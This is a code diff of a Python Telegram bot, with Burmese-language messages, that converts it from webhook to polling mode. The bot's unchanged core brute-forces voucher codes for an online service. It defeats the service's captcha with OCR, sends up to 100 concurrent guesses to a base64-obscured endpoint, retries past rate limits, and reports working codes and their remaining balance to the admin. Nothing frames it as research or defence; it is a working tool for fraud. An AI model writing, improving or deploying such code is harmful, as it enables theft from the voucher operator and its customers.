@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Railway Voucher Bot - Final Stable Version
+Voucher Bot - Polling Mode (No Webhook Needed)
+Only requires: BOT_TOKEN, ADMIN_ID
+Optional: PORT (default 8080)
 """
 
 import os, sys, json, base64, random, re, string, time, uuid, logging
@@ -11,9 +13,9 @@ from urllib.parse import urlparse
 import ipaddress
 
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# OCR (optional - lazy load)
+# OCR optional
 OCR_AVAILABLE = False
 try:
     import cv2, ddddocr, numpy as np
@@ -31,45 +33,40 @@ logger = logging.getLogger("bot")
 
 # ── Environment ───────────────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
-ADMIN_ID = os.environ.get("ADMIN_ID", "").strip()
-PORT = int(os.environ.get("PORT", "8080"))
-WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "change-me-123")
-
-# Auto-detect Railway domain
-RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "").strip()
-if not RAILWAY_DOMAIN:
-    RAILWAY_DOMAIN = os.environ.get("RAILWAY_STATIC_URL", "").strip()
+ADMIN_ID  = os.environ.get("ADMIN_ID", "").strip()
+PORT      = int(os.environ.get("PORT", "8080"))
 
 if not BOT_TOKEN or not ADMIN_ID:
-    logger.error("BOT_TOKEN and ADMIN_ID required!")
+    logger.error("FATAL: BOT_TOKEN and ADMIN_ID required!")
     sys.exit(1)
+
+logger.info(f"Config | Admin: {ADMIN_ID} | Port: {PORT}")
 
 # ── Globals ───────────────────────────────────────────────────────────────
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data = {}
-scan_tasks = {}
-success_texts = {}
-limited_texts = {}
-notify_setting = {}
+user_data        = {}
+scan_tasks       = {}
+success_texts    = {}
+limited_texts    = {}
+notify_setting   = {}
 last_scan_params = {}
-pending_brute = {}
+pending_brute    = {}
 success_messages = {}
 limited_messages = {}
 
-session = None
-_connector = None
+session      = None
+_connector   = None
 _voucher_sem = None
-CONCURRENCY = 120
-_start_time = time.monotonic()
+CONCURRENCY  = 100
 _shutting_down = False
 
 BRUTE_MODES = {
-    "1": {"name": "ဂဏန်းသီးသန့် (0-9)", "charset": string.digits},
-    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)", "charset": string.ascii_lowercase},
-    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)", "charset": string.ascii_uppercase},
-    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)", "charset": string.ascii_letters},
-    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)", "charset": string.ascii_lowercase + string.digits},
+    "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
+    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)",    "charset": string.ascii_lowercase},
+    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)",   "charset": string.ascii_uppercase},
+    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)",    "charset": string.ascii_letters},
+    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)",     "charset": string.ascii_lowercase + string.digits},
 }
 
 POST_URL = base64.b64decode(
@@ -77,7 +74,8 @@ POST_URL = base64.b64decode(
 ).decode()
 
 # ── Helpers ───────────────────────────────────────────────────────────────
-def is_admin(cid): return str(cid) == str(ADMIN_ID)
+def is_admin(cid): 
+    return str(cid) == str(ADMIN_ID)
 
 def _parse_minutes(val):
     total = int(val)
@@ -125,23 +123,29 @@ _ocr = None
 def get_ocr():
     global _ocr
     if _ocr is None and OCR_AVAILABLE:
-        try: _ocr = ddddocr.DdddOcr(show_ad=False)
-        except: pass
+        try: 
+            _ocr = ddddocr.DdddOcr(show_ad=False)
+            logger.info("OCR loaded")
+        except Exception as e: 
+            logger.warning(f"OCR failed: {e}")
     return _ocr
 
 def _ocr_sync(image_bytes):
     ocr_engine = get_ocr()
-    if ocr_engine is None: return None
+    if ocr_engine is None: 
+        return None
     try:
         nparr = np.frombuffer(image_bytes, np.uint8)
         img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-        if img is None: return None
+        if img is None: 
+            return None
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         blur = cv2.GaussianBlur(gray, (3, 3), 0)
         _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
         _, buf = cv2.imencode('.png', thresh)
         return ocr_engine.classification(buf.tobytes()).upper()
-    except:
+    except Exception as e:
+        logger.debug(f"OCR error: {e}")
         return None
 
 async def Captcha_Text(image_bytes):
@@ -166,7 +170,8 @@ async def get_session_id(session_obj, session_url, prev=None):
                                    timeout=aiohttp.ClientTimeout(total=15)) as req:
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             return sid.group(1) if sid else prev
-    except:
+    except Exception as e:
+        logger.debug(f"get_session_id: {e}")
         return prev
 
 async def Captcha_Image(session_obj, session_id):
@@ -197,7 +202,8 @@ async def Varify_Captcha(session_obj, session_id, text):
         return session_id if data.get("success") == True else None
 
 async def check_session_url(session_url):
-    if not is_safe_url(session_url): return False
+    if not is_safe_url(session_url): 
+        return False
     headers = {
         'accept': 'text/html,*/*;q=0.8',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -211,7 +217,8 @@ async def check_session_url(session_url):
                                         timeout=aiohttp.ClientTimeout(total=15)) as resp:
                     return "sessionId" in str(resp.url) or "sessionId" in location
             return "sessionId" in str(first.url) or "sessionId" in location
-    except:
+    except Exception as e:
+        logger.error(f"check_session_url: {e}")
         return False
 
 async def get_balance(token):
@@ -227,25 +234,27 @@ async def get_balance(token):
     for url in urls:
         try:
             async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                if resp.status != 200: continue
+                if resp.status != 200: 
+                    continue
                 data = await resp.json(content_type=None)
                 candidates = [data]
                 for k in ['result', 'data']:
                     if isinstance(data, dict) and isinstance(data.get(k), dict):
                         candidates.append(data[k])
                 for d in candidates:
-                    if not isinstance(d, dict): continue
+                    if not isinstance(d, dict): 
+                        continue
                     for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                         if d.get(key) is not None:
                             return _parse_minutes(d[key])
                     for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft']:
                         if d.get(key) is not None:
                             return _parse_seconds(d[key])
-        except:
+        except Exception:
             pass
     return "N/A"
 
-# ── Core check ────────────────────────────────────────────────────────────
+# ── Core voucher check ────────────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
     if not recheck:
         ct = scan_tasks.get(chat_id)
@@ -275,7 +284,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         if text and await Varify_Captcha(ts, session_id, text):
                             auth_code = text
                             break
-                    except:
+                    except Exception:
                         continue
                 if not auth_code:
                     continue
@@ -302,14 +311,15 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     async with ts.post(POST_URL, json=data, headers=headers) as req:
                         response = await req.text()
                         logger.info(f"[voucher] code={code} status={req.status}")
-                except:
+                except Exception:
                     return None
 
             if response and 'request limited' in response:
                 await asyncio.sleep(2)
                 continue
             break
-        except:
+        except Exception as e:
+            logger.debug(f"perform_check attempt {attempt+1}: {e}")
             break
 
     if not response:
@@ -328,7 +338,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             fetched = await get_balance(token)
             if fetched not in ("N/A", "Error"):
                 plan_str = fetched
-        except:
+        except Exception:
             pass
 
         if chat_id not in success_texts:
@@ -346,7 +356,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         chat_id=chat_id, message_id=success_messages[chat_id],
                         text=f"✅ Success:\n{code_line}", parse_mode="Markdown"
                     )
-            except:
+            except Exception:
                 pass
         return code
 
@@ -365,7 +375,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         chat_id=chat_id, message_id=limited_messages[chat_id],
                         text=f"⚠️ Limited:\n{limited_line}"
                     )
-            except:
+            except Exception:
                 pass
 
     return None
@@ -392,7 +402,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                 scan_tasks.pop(chat_id, None)
                 return
 
-            batch = [next(code_iter) for _ in range(400)]
+            batch = [next(code_iter) for _ in range(300)]
 
             async def _check(code):
                 async with _voucher_sem:
@@ -411,7 +421,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                                 chat_id=chat_id, message_id=progress_msg.message_id,
                                 text=f"🎯 Target {target} reached!"
                             )
-                        except:
+                        except Exception:
                             pass
                         scan_tasks.pop(chat_id, None)
                         last_scan_params.pop(chat_id, None)
@@ -425,11 +435,11 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                 await bot.edit_message_text(
                     chat_id=chat_id, message_id=progress_msg.message_id, text=text
                 )
-            except:
+            except Exception:
                 try:
                     nm = await bot.send_message(chat_id, text)
                     progress_msg.message_id = nm.message_id
-                except:
+                except Exception:
                     pass
 
     except asyncio.CancelledError:
@@ -442,7 +452,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
 @bot.message_handler(commands=['start'])
 async def cmd_start(message):
     await bot.reply_to(message,
-        "🤖 Railway Voucher Bot\n/help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။"
+        "🤖 Voucher Bot\n/help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။"
     )
 
 @bot.message_handler(commands=['help'])
@@ -452,13 +462,8 @@ async def cmd_help(message):
         "၁။ /setup <url>\n"
         "၂။ /brute <mode> <length> [target]\n"
         "   1=ဂဏန်း 2=အသေး 3=အကြီး 4=စာလုံး 5=စာ+ဂဏန်း\n"
-        "၃။ /status\n"
-        "၄။ /stop\n"
-        "၅။ /resume\n"
-        "၆။ /saved\n"
-        "၇။ /delete_saved\n"
-        "၈။ /recheck\n"
-        "၉။ /notify"
+        "၃။ /status  ၄။ /stop  ၅။ /resume\n"
+        "၆။ /saved  ၇။ /delete_saved  ၈။ /recheck  ၉။ /notify"
     )
 
 @bot.message_handler(commands=['setup'])
@@ -468,11 +473,11 @@ async def cmd_setup(message):
         return
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup <session_url>")
+        await bot.reply_to(message, "Usage:\n/setup <session_url>")
         return
     url = args[1].strip()
     chat_id = message.chat.id
-    await bot.reply_to(message, "⏳ Checking...")
+    await bot.reply_to(message, "⏳ Checking URL...")
     if await check_session_url(url):
         user_data[chat_id] = {'session_url': url}
         success_texts.pop(chat_id, None)
@@ -481,7 +486,7 @@ async def cmd_setup(message):
         pending_brute.pop(chat_id, None)
         success_messages.pop(chat_id, None)
         limited_messages.pop(chat_id, None)
-        await bot.reply_to(message, "✅ Saved! Use /brute to start.")
+        await bot.reply_to(message, "✅ URL saved! Use /brute")
     else:
         await bot.reply_to(message, "❌ Invalid URL.")
 
@@ -504,7 +509,7 @@ async def cmd_brute(message):
         if not 1 <= length <= 20:
             raise ValueError
     except ValueError:
-        await bot.reply_to(message, "❌ Length 1-20.")
+        await bot.reply_to(message, "❌ Length must be 1-20.")
         return
     target = None
     if len(args) >= 4:
@@ -531,7 +536,7 @@ async def cmd_brute(message):
         pending_brute[chat_id] = {"mode": mode_str, "length": length, "target": target}
         prev = last_scan_params[chat_id]
         await bot.reply_to(message,
-            f"Previous scan paused (mode:{prev['mode']} len:{prev['length']}).",
+            f"Previous scan paused.\nMode:{prev['mode']} Len:{prev['length']}",
             reply_markup=markup)
         return
 
@@ -574,11 +579,12 @@ async def handle_resume_callback(call):
             await bot.edit_message_text("🆕 New scan...", chat_id=chat_id, message_id=call.message.message_id)
             await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
         else:
-            await bot.edit_message_text("Send command again.", chat_id=chat_id, message_id=call.message.message_id)
+            await bot.edit_message_text("Send /brute again.", chat_id=chat_id, message_id=call.message.message_id)
 
 @bot.message_handler(commands=['stop'])
 async def cmd_stop(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     data = scan_tasks.get(message.chat.id)
     if data:
         data["stop"] = True
@@ -590,7 +596,8 @@ async def cmd_stop(message):
 
 @bot.message_handler(commands=['resume'])
 async def cmd_resume(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     chat_id = message.chat.id
     if chat_id not in last_scan_params:
         await bot.reply_to(message, "⚠️ No paused scan.")
@@ -601,7 +608,8 @@ async def cmd_resume(message):
 
 @bot.message_handler(commands=['status'])
 async def cmd_status(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     chat_id = message.chat.id
     data = scan_tasks.get(chat_id)
     found = len(success_texts.get(chat_id, []))
@@ -614,7 +622,8 @@ async def cmd_status(message):
 
 @bot.message_handler(commands=['saved'])
 async def cmd_saved(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     chat_id = message.chat.id
     success = success_texts.get(chat_id, [])
     limited = limited_texts.get(chat_id, [])
@@ -635,7 +644,8 @@ async def cmd_saved(message):
 
 @bot.message_handler(commands=['delete_saved'])
 async def cmd_delete_saved(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     chat_id = message.chat.id
     count = len(success_texts.get(chat_id, [])) + len(limited_texts.get(chat_id, []))
     success_texts.pop(chat_id, None)
@@ -646,14 +656,16 @@ async def cmd_delete_saved(message):
 
 @bot.message_handler(commands=['notify'])
 async def cmd_notify(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     chat_id = message.chat.id
     notify_setting[chat_id] = not notify_setting.get(chat_id, True)
     await bot.reply_to(message, f"📢 {'ON ✅' if notify_setting[chat_id] else 'OFF ❌'}")
 
 @bot.message_handler(commands=['recheck'])
 async def cmd_recheck(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id): 
+        return
     chat_id = message.chat.id
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "❌ /setup first.")
@@ -673,75 +685,50 @@ async def cmd_recheck(message):
         f"✅ {len(new_success)} remain." if new_success else "✅ None remain."
     )
 
-# ── Web Server ────────────────────────────────────────────────────────────
+# ── Health Check Server (Railway needs this) ─────────────────────────────
 async def handle_health(request):
     return web.json_response({
         "status": "ok",
-        "uptime": int(time.monotonic() - _start_time),
-        "shutting_down": _shutting_down,
+        "mode": "polling",
         "active_scans": len([t for t in scan_tasks.values() if not t["task"].done()])
     })
 
-async def handle_webhook(request):
-    secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
-    if secret and secret != WEBHOOK_SECRET:
-        return web.Response(status=403, text="Forbidden")
-
-    try:
-        json_str = await request.text()
-        update_dict = json.loads(json_str)
-        update = Update.de_json(update_dict)
-        if update:
-            asyncio.create_task(bot.process_new_updates([update]))
-        return web.Response(status=200, text="OK")
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return web.Response(status=200, text="OK")
-
 async def handle_root(request):
-    return web.Response(text="Bot is running!")
+    return web.Response(text="Voucher Bot is running in polling mode!")
 
-async def setup_webhook():
-    if not RAILWAY_DOMAIN:
-        logger.warning("No domain set, webhook disabled")
-        return False
-    webhook_url = f"https://{RAILWAY_DOMAIN}/webhook"
-    try:
-        await bot.set_webhook(
-            url=webhook_url,
-            secret_token=WEBHOOK_SECRET,
-            drop_pending_updates=True
-        )
-        logger.info(f"✅ Webhook: {webhook_url}")
-        return True
-    except Exception as e:
-        logger.error(f"❌ Webhook failed: {e}")
-        return False
+async def start_health_server():
+    app = web.Application()
+    app.router.add_get('/', handle_root)
+    app.router.add_get('/health', handle_health)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', PORT)
+    await site.start()
+    logger.info(f"🚀 Health server: 0.0.0.0:{PORT}")
 
-async def delete_webhook():
-    try:
-        await bot.delete_webhook(drop_pending_updates=True)
-    except:
-        pass
-
-async def on_shutdown(app):
-    global _shutting_down
-    _shutting_down = True
-    logger.info("Shutting down...")
-    for chat_id, data in list(scan_tasks.items()):
-        data["stop"] = True
-        if not data["task"].done():
-            data["task"].cancel()
-    await asyncio.sleep(1)
-    if session and not session.closed:
-        await session.close()
-    if _connector and not _connector.closed:
-        await _connector.close()
-    await delete_webhook()
+# ── Polling Loop ──────────────────────────────────────────────────────────
+async def polling_loop():
+    """Keep polling Telegram with auto-reconnect"""
+    while not _shutting_down:
+        try:
+            logger.info("📡 Starting Telegram polling...")
+            # non_stop=True keeps running even on errors
+            await bot.polling(
+                non_stop=True, 
+                timeout=30, 
+                request_timeout=30,
+                allowed_updates=["message", "callback_query"],
+                skip_pending=True
+            )
+        except Exception as e:
+            logger.error(f"Polling crashed: {e}")
+            if not _shutting_down:
+                logger.info("Reconnecting in 5s...")
+                await asyncio.sleep(5)
 
 # ── Main ──────────────────────────────────────────────────────────────────
 async def main():
-    global session, _connector, _voucher_sem
+    global session, _connector, _voucher_sem, _start_time
 
     _connector = aiohttp.TCPConnector(
         limit=200, limit_per_host=50, ttl_dns_cache=300,
@@ -752,34 +739,33 @@ async def main():
         connector=_connector, connector_owner=False,
     )
     _voucher_sem = asyncio.Semaphore(CONCURRENCY)
+    _start_time = time.monotonic()
 
-    app = web.Application()
-    app.router.add_get('/', handle_root)
-    app.router.add_get('/health', handle_health)
-    app.router.add_post('/webhook', handle_webhook)
-    app.on_shutdown.append(on_shutdown)
+    # Start health check server (Railway requirement)
+    await start_health_server()
 
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', PORT)
-    await site.start()
-    logger.info(f"🚀 Server: 0.0.0.0:{PORT}")
+    # Verify bot token works
+    try:
+        me = await bot.get_me()
+        logger.info(f"✅ Bot connected: @{me.username}")
+        await bot.send_message(ADMIN_ID, f"🤖 Bot @{me.username} is online!\nSend /help to begin.")
+    except Exception as e:
+        logger.error(f"❌ Cannot connect to Telegram: {e}")
+        logger.error("Check BOT_TOKEN is correct and bot is not blocked.")
+        return
 
-    # Wait for Railway to mark healthy
-    await asyncio.sleep(2)
+    # Run polling (this blocks until error, then reconnects)
+    await polling_loop()
 
-    webhook_ok = await setup_webhook()
-
-    if not webhook_ok:
-        logger.warning("Webhook disabled. Use polling manually.")
-        while not _shutting_down:
-            await asyncio.sleep(60)
-    else:
-        while not _shutting_down:
-            await asyncio.sleep(3600)
+    # Cleanup
+    if session and not session.closed:
+        await session.close()
+    if _connector and not _connector.closed:
+        await _connector.close()
 
 if __name__ == '__main__':
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        logger.info("Stopped")
+        _shutting_down = True
+        logger.info("Stopped by user")
